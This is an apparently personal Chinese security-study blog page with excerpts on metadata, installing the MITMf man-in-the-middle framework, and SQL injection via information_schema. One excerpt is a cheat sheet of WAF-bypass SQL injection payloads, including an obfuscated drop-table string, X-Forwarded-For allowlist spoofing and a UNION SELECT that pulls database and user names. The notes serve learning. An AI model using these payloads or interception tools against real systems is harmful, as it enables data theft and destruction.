<!DOCTYPE HTML>
<html>
<head>
  <meta charset="utf-8">
  <meta http-equiv="pragma" content="no-cache">
  <meta http-equiv="cache-control" content="no-cache">
  <meta http-equiv="expires" content="0">
  
  <title>Page 3 | josyaaa</title>
  <meta name="author" content="josyaaa">
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  
  <meta property="og:site_name" content="josyaaa"/>

  
    <meta property="og:image" content=""/>
  

  
  
    <link href="/josyaaa/favicon.png" rel="icon">
  
  
  <link rel="stylesheet" href="/josyaaa/css/bootstrap.min.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/josyaaa/css/font-awesome.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/josyaaa/css/style.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/josyaaa/css/responsive.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/josyaaa/css/highlight.css" media="screen" type="text/css">
  <link rel="stylesheet" href="/josyaaa/css/google-fonts.css" media="screen" type="text/css">
  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

  <script src="/josyaaa/js/jquery-2.0.3.min.js"></script>

  <!-- analytics -->
  



<meta name="generator" content="Hexo 6.2.0"></head>

 <body>  
  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
    <div class="container">
      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
		<span class="sr-only">Toggle navigation</span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
        <span class="icon-bar"></span>
      </button>
	  <a class="navbar-brand" href="/josyaaa/">josyaaa</a>
      <div class="collapse navbar-collapse nav-menu">
		<ul class="nav navbar-nav">
		  
		  <li>
			<a href="/josyaaa/archives" title="All the articles.">
			  <i class=""></i>Archives
			</a>
		  </li>
		  
		  <li>
			<a href="/josyaaa/categories" title="All the categories.">
			  <i class=""></i>Categories
			</a>
		  </li>
		  
		  <li>
			<a href="/josyaaa/tags" title="All the tags.">
			  <i class=""></i>Tags
			</a>
		  </li>
		  
		  <li>
			<a href="/josyaaa/about" title="About me.">
			  <i class=""></i>About
			</a>
		  </li>
		  
		</ul>
      </div>
    </div> <!-- container -->
</nav>
<div class="clearfix"></div>

  <div class="container">
  	<div class="content">
    	 <div class="page-header logo">
  <h1>josyaaa<span class="blink-fast">∎</span></h1>
</div>

<div class="row page">

	
	<div class="col-md-9">
	

		<div class="slogan">


		<i class="fa fa-heart blink-slow"></i>

		okay!😯 你觉得我很菜，我无话可说

</div>    

		<div id="top_search"></div>
		<div class="mypage">
		
		<!-- title and entry -->
		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/12/metadata/" >了解元数据</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-12  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<ol>
<li>描述性元数据支持资源的发现、识别和选择。它可以包括标题、作者和主题等元素。</li>
<li>管理元数据有助于资源的管理。它可以包括技术、保存、权利和使用等要素。</li>
<li>结构元数据，通常用于机器处理，描述资源各个部分之间的关​​系，例如书中的章节。</li>
</ol>
<p><a target="_blank" rel="noopener" href="https://guides.lib.utexas.edu/metadata-basics/harvesting">Metadata Basics</a><br><a target="_blank" rel="noopener" href="https://nsdl.oercommons.org/">THE NATIONAL SCIENCE DICITAL LIBRARY</a></p>
<h2 id="元数据重要性"><a href="#元数据重要性" class="headerlink" title="元数据重要性"></a>元数据重要性</h2><p><a target="_blank" rel="noopener" href="https://www.opendatasoft.com/en/blog/what-is-metadata-and-why-is-it-important-data/">what is metadata and why is it as important as the data itself ?</a><br><a target="_blank" rel="noopener" href="https://www.opendatasoft.com/en/blog/all-you-need-to-know-about-metadata">all you need t know but metadata ?</a></p>
<h2 id="元数据基本问题"><a href="#元数据基本问题" class="headerlink" title="元数据基本问题"></a>元数据基本问题</h2><ul>
<li>元数据需要回答“谁、什么、何地、何时以及为什么”</li>
<li>元数据提供一个标准格式以实现互惠操作性，提高数据质量并促进数据的更多使用</li>
</ul>
<h2 id="元数据增强数据重用"><a href="#元数据增强数据重用" class="headerlink" title="元数据增强数据重用"></a>元数据增强数据重用</h2><ul>
<li>类</li>
<li>实例</li>
<li>事物之间的关系</li>
<li>事物的属性</li>
<li>与事物相关的功能、过程、约束和规则</li>
</ul>
<h2 id="价值元数据"><a href="#价值元数据" class="headerlink" title="价值元数据"></a>价值元数据</h2><ul>
<li>数据质量与数据的来源有关。如果没有元数据来提供出处，就有一个没有上下文的数据集。没有上下文的数据，如人工制品、化学品、小苏打或任何其他随机对象，几乎没有价值。</li>
<li>元数据本身就非常有用。元数据可以提供指向数据集的指针，即使没有实际数据。可以围绕给定主题存在的数据整理出一个组织结构图。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Riechert, Mathias, et al. “Developing Definitions of Research Information Metadata as a Wicked Problem? Characterisation and Solution by Argumentation Visualisation.” Program 50.3 (2016).</span><br><span class="line"></span><br><span class="line">S. Ram and J. Liu, “A Semiotics Framework for Analyzing Data Provenance Research,” Journal of Computing Science and Engineering, vol. 2, pp. 221-248, 2008.)</span><br><span class="line"></span><br><span class="line">Wilson, Samuel P. Developing a metadata repository for distributed file annotation and sharing. Diss. PURDUE UNIVERSITY, 2015.</span><br><span class="line"></span><br><span class="line">Polleres, Axel and Simon Steyskal. “Semantic Web Standards for Publishing and Integrating open data.” Standards and Standardization: Concepts, Methodologies, Tools, and Applications (2015): 1.</span><br><span class="line"></span><br><span class="line">Daraio, Cinzia, et al. “The advantages of an Ontology-Based Data Management Approach: Openness, Interoperability, and Data Quality.” Scientometrics (2016): 1-15.</span><br><span class="line"></span><br><span class="line">Fukuta, Naoki. “Toward an Agent-Based Framework for Better Access to open data by Using Ontology Mappings and their Underlying Semantics.” Advanced Applied Informatics (IIAI-</span><br><span class="line">AAI), 2015 IIAI 4th International Congress. IEEE, 2015.</span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/12/metadata/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/12/MITMF/" >安装 MITMF tools</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-12  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="how-to-install-MITMF-in-kali-liunx"><a href="#how-to-install-MITMF-in-kali-liunx" class="headerlink" title="how to install MITMF in kali liunx"></a>how to install MITMF in kali liunx</h1><p>MITMf – 中间人攻击框架</p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>MITMf 旨在为中间人攻击和网络攻击提供一站式服务，同时更新和改进现有的攻击和技术<br>它最初是为了解决其他工具（例如 Ettercap、Mallory）的重大缺陷而构建的，它几乎完全从头开始重写，以提供一个模块化且易于扩展的框架，任何人都可以使用它来实现自己的 MITM 攻击</p>
<h2 id="特征"><a href="#特征" class="headerlink" title="特征"></a>特征</h2><ul>
<li>该框架包含一个内置的 SMB、HTTP 和 DNS 服务器，可以由各种插件控制和使用，它包含 SSLStrip 代理的修改版本，允许 HTTP 修改和部分 HSTS 绕过</li>
<li>从 0.9.8 版开始，MITMf 支持主动数据包过滤和操作（基本上是 etterfilters 所做的，只是更好），允许用户修改任何类型的流量或协议</li>
<li>配置文件可以在 MITMf 运行时即时编辑，更改将通过框架传递：这允许您在执行攻击时调整插件和服务器的设置</li>
<li>MITMf 将使用运行在启动</li>
<li>响应程序集成允许 LLMNR、NBT-NS 和 MDNS 中毒以及 WPAD 流氓服务器支持</li>
</ul>
<h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">1. sudo -i</span><br><span class="line">2. apt-get update &amp;&amp; apt-get upgrade -y</span><br><span class="line">3. apt-get install python-dev-is-python2 python-setuptools libpcap0.8-dev libnetfilter-queue-dev libssl-dev libjpeg-dev libxml2-dev libxslt1-dev libcapstone4 libcapstone-dev -y</span><br><span class="line">4. curl https://bootstrap.pypa.io/pip/2.7/get-pip.py -o get-pip.py</span><br><span class="line">5. python get-pip.py</span><br><span class="line">6. pip2 install virtualenvwrapper</span><br><span class="line">7. export VIRTUALENVWRAPPER_PYTHON=/usr/bin/python</span><br><span class="line">8. source `which virtualenvwrapper.sh`</span><br><span class="line">9. mkvirtualenv MITMf -p /usr/bin/python2.7</span><br><span class="line">10. git clone https://github.com/byt3bl33d3r/MITMf</span><br><span class="line">11. cd MITMf &amp;&amp; git submodule init &amp;&amp; git submodule update – recursive</span><br><span class="line">12. pip2 install -r requirements.txt</span><br><span class="line">13. pip2 install pyinotify configobj twisted pillow pefile python-magic capstone</span><br><span class="line">14. python mitmf.py -v</span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/12/MITMF/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/12/MYSQL-Bypass/" >How to bypass 是 web</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-12  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<h1 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h1><p>利用WEB程序缺陷，容器特性,网络协议，数据库特性来组合利用绕过</p>
<h1 id="常见"><a href="#常见" class="headerlink" title="常见"></a>常见</h1><ol>
<li>HTTP协议</li>
<li>大小混写</li>
<li>替换</li>
<li>使用特殊字符</li>
<li>使用编码</li>
<li>等价替换</li>
<li>容器特性</li>
<li>白名单</li>
<li>缓冲溢出</li>
<li>…</li>
</ol>
<h3 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h3><ol>
<li>构造畸形数据包</li>
<li>编码</li>
<li>分块</li>
<li>数据包溢出</li>
</ol>
<h3 id="大小混写"><a href="#大小混写" class="headerlink" title="大小混写"></a>大小混写</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UnIon SlEct</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="替换"><a href="#替换" class="headerlink" title="替换"></a>替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ununionion seselectlect</span><br><span class="line"></span><br><span class="line">un/**/ion se/**/lect</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="特殊字符"><a href="#特殊字符" class="headerlink" title="特殊字符"></a>特殊字符</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">`updatexml`</span><br><span class="line"></span><br><span class="line">and!!!1=1</span><br><span class="line"></span><br><span class="line">/**/</span><br><span class="line"></span><br><span class="line">/*!50000*/</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="使用编码"><a href="#使用编码" class="headerlink" title="使用编码"></a>使用编码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">= -&gt; %3D -&gt;%25%33%44</span><br><span class="line"></span><br><span class="line">and 1=1 -&gt; YW5kIDE9MQ==</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="等价替换"><a href="#等价替换" class="headerlink" title="等价替换"></a>等价替换</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">substr(version(),1,1)</span><br><span class="line">Substring(version(),1,1)</span><br><span class="line">Left(version(),1)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="容器特性"><a href="#容器特性" class="headerlink" title="容器特性"></a>容器特性</h3><ol>
<li>iis</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">iis+asp 的%特性：当传入的 s%e%l%e%c%t 函数被%分割时，解析出来还是select</span><br><span class="line">iis+asp 的unicode特性 ： iis支持Unicode的解析 我们传入s%u0065lect解析为select</span><br><span class="line"></span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line">    |   Keywords     |        WAF             |  ASP/ASP.NET             |</span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line">    | sele%ct * fr%om..  | sele%ct * fr%om..      | select * from..      |</span><br><span class="line">    | ;dr%op ta%ble xxx  | ;dr%op ta%ble xxx      | ;drop table xxx      |</span><br><span class="line">    | &lt;scr%ipt&gt;      | &lt;scr%ipt&gt;                  | &lt;script&gt;             |</span><br><span class="line">    | &lt;if%rame&gt;      | &lt;if%rame&gt;                  | &lt;iframe&gt;             |</span><br><span class="line">    +--------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="2">
<li>hpp</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">php+apache    &amp;id=1&amp;id=2     他只解析最后一个</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| Web Server      | Parameter Interpretation         | Example     |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line">| ASP.NET/IIS     | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| ASP/IIS         | Concatenation by comma       | par1=val1,val2  |</span><br><span class="line">| PHP/Apache      | The last param is resulting  | par1=val2       |</span><br><span class="line">| JSP/Tomcat      | The first param is resulting | par1=val1       |</span><br><span class="line">| Perl/Apache     | The first param is resulting | par1=val1       |</span><br><span class="line">| DBMan           | Concatenation by two tildes  | par1=val1~~val2 |</span><br><span class="line">+------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ol start="3">
<li>HTTP Parameter Contamination</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| Query String    |    Web Servers response / GET values    |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">|         | Apache/2.2.16, PHP/5.3.3 | IIS6/ASP             |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line">| ?test[1=2       | test_1=2             | test[1=2         |</span><br><span class="line">| ?test=%         | test=%               | test=            |</span><br><span class="line">| ?test%00=1      | test=1               | test=1           |</span><br><span class="line">| ?test=1%001     | NULL                 | test=1           |</span><br><span class="line">| ?test+d=1+2     | test_d=1 2           | test d=1 2       |</span><br><span class="line">+-----------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><p>有的程序他会对本地ip不拦截，同时他的host使用<code>X-Forwarded-For</code> 等来获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="缓冲溢出"><a href="#缓冲溢出" class="headerlink" title="缓冲溢出"></a>缓冲溢出</h3><p>waf他处理数据包的大小有限，早期安全狗你提交过长url会直接奔溃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=1 and (select 1)=(Select 0xA*1000)+UnIoN+SeLeCT+1,2,version(),4,5,database(),user(),8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26</span><br><span class="line"></span><br></pre></td></tr></table></figure>

	
	</div>
  <a type="button" href="/josyaaa/2022/05/12/MYSQL-Bypass/#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/josyaaa/2022/05/12/MYSQL-SQL/" >SQL 注入 ？？？？</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2022-05-12  </div>
		</div>
	</div>
	


			<div class="entry">
  <div class="row">
	
	
		<p>建立数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; create database mysqltest;</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查询所有数据库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show databases;</span><br><span class="line">+--------------------+</span><br><span class="line">| Database           |</span><br><span class="line">+--------------------+</span><br><span class="line">| information_schema |</span><br><span class="line">| mysql              |</span><br><span class="line">| mysqltest          |</span><br><span class="line">| performance_schema |</span><br><span class="line">+--------------------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用数据库 新建一个表</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; use mysqltest</span><br><span class="line">Database changed</span><br><span class="line">mysql&gt; create table admin (id int,username varchar(255),password varchar(255));</span><br><span class="line">Query OK, 0 rows affected (0.09 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查看数据库，插入，与查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------+</span><br><span class="line">| Tables_in_mysqltest |</span><br><span class="line">+---------------------+</span><br><span class="line">| admin               |</span><br><span class="line">+---------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; insert into admin (id,username,password) values (1,&quot;admin&quot;,&quot;admin&quot;);</span><br><span class="line">Query OK, 1 row affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from admin;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>查询 where 语句</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from admin where id =1;</span><br><span class="line">+------+----------+----------+</span><br><span class="line">| id   | username | password |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">|    1 | admin    | admin    |</span><br><span class="line">+------+----------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h1 id="information-schema"><a href="#information-schema" class="headerlink" title="information_schema"></a>information_schema</h1><p>information_schema是用于存储数据库元数据的表，保存数据库名，表名，列名等信息，从爆破表名可以直接查询</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; show tables;</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| Tables_in_information_schema          |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">| CHARACTER_SETS                        |</span><br><span class="line">| COLLATIONS                            |</span><br><span class="line">| COLLATION_CHARACTER_SET_APPLICABILITY |</span><br><span class="line">| COLUMNS                               |</span><br><span class="line">| COLUMN_PRIVILEGES                     |</span><br><span class="line">| ENGINES                               |</span><br><span class="line">| EVENTS                                |</span><br><span class="line">| FILES                                 |</span><br><span class="line">| GLOBAL_STATUS                         |</span><br><span class="line">| GLOBAL_VARIABLES                      |</span><br><span class="line">| KEY_COLUMN_USAGE                      |</span><br><span class="line">| OPTIMIZER_TRACE                       |</span><br><span class="line">| PARAMETERS                            |</span><br><span class="line">| PARTITIONS                            |</span><br><span class="line">| PLUGINS                               |</span><br><span class="line">| PROCESSLIST                           |</span><br><span class="line">| PROFILING                             |</span><br><span class="line">| REFERENTIAL_CONSTRAINTS               |</span><br><span class="line">| ROUTINES                              |</span><br><span class="line">| SCHEMATA                              |</span><br><span class="line">| SCHEMA_PRIVILEGES                     |</span><br><span class="line">| SESSION_STATUS                        |</span><br><span class="line">| SESSION_VARIABLES                     |</span><br><span class="line">| STATISTICS                            |</span><br><span class="line">| TABLES                                |</span><br><span class="line">| TABLESPACES                           |</span><br><span class="line">| TABLE_CONSTRAINTS                     |</span><br><span class="line">| TABLE_PRIVILEGES                      |</span><br><span class="line">| TRIGGERS                              |</span><br><span class="line">| USER_PRIVILEGES                       |</span><br><span class="line">| VIEWS                                 |</span><br><span class="line">| INNODB_LOCKS                          |</span><br><span class="line">| INNODB_TRX                            |</span><br><span class="line">| INNODB_SYS_DATAFILES                  |</span><br><span class="line">| INNODB_LOCK_WAITS                     |</span><br><span class="line">| INNODB_SYS_TABLESTATS                 |</span><br><span class="line">| INNODB_CMP                            |</span><br><span class="line">| INNODB_METRICS                        |</span><br><span class="line">| INNODB_CMP_RESET                      |</span><br><span class="line">| INNODB_CMP_PER_INDEX                  |</span><br><span class="line">| INNODB_CMPMEM_RESET                   |</span><br><span class="line">| INNODB_FT_DELETED                     |</span><br><span class="line">| INNODB_BUFFER_PAGE_LRU                |</span><br><span class="line">| INNODB_SYS_FOREIGN                    |</span><br><span class="line">| INNODB_SYS_COLUMNS                    |</span><br><span class="line">| INNODB_SYS_INDEXES                    |</span><br><span class="line">| INNODB_FT_DEFAULT_STOPWORD            |</span><br><span class="line">| INNODB_SYS_FIELDS                     |</span><br><span class="line">| INNODB_CMP_PER_INDEX_RESET            |</span><br><span class="line">| INNODB_BUFFER_PAGE                    |</span><br><span class="line">| INNODB_CMPMEM                         |</span><br><span class="line">| INNODB_FT_INDEX_TABLE                 |</span><br><span class="line">| INNODB_FT_BEING_DELETED               |</span><br><span class="line">| INNODB_SYS_TABLESPACES                |</span><br><span class="line">| INNODB_FT_INDEX_CACHE                 |</span><br><span class="line">| INNODB_SYS_FOREIGN_COLS               |</span><br><span class="line">| INNODB_SYS_TABLES                     |</span><br><span class="line">| INNODB_BUFFER_POOL_STATS              |</span><br><span class="line">| INNODB_FT_CONFIG                      |</span><br><span class="line">+---------------------------------------+</span><br><span class="line">59 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>常用:</p>
<ol>
<li>SCHEMATA表 ： 提供了当前mysql实例中所有数据库的信息。</li>
<li>TABLES 表 ： 提供了关于数据库中的表的信息。</li>
<li>COLUMNS 表 ：提供了表中的列信息</li>
</ol>
<p>SCHEMATA:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from information_schema.schemata;</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | mysqltest          | latin1                     | latin1_swedish_ci      | NULL     |</span><br><span class="line">| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |</span><br><span class="line">+--------------+--------------------+----------------------------+------------------------+----------+</span><br><span class="line">4 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>TABLES:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select table_name from information_schema.tables where table_schema=0x6D7973716C74657374;  //注意这里不用引号就要把数据库名转为16进制</span><br><span class="line">+------------+</span><br><span class="line">| table_name |</span><br><span class="line">+------------+</span><br><span class="line">| admin      |</span><br><span class="line">+------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>COLUMNS：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select column_name from information_schema.columns where table_name=0x61646D696E;  </span><br><span class="line">+-------------+</span><br><span class="line">| column_name |</span><br><span class="line">+-------------+</span><br><span class="line">| id          |</span><br><span class="line">| username    |</span><br><span class="line">| password    |</span><br><span class="line">+-------------+</span><br><span class="line">3 rows in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>information_schema储存的是所有数据库的信息,If <code>mysqltest1</code> <code>mysqltest2</code> 都存在admin表的话 它都会显示出来</p>
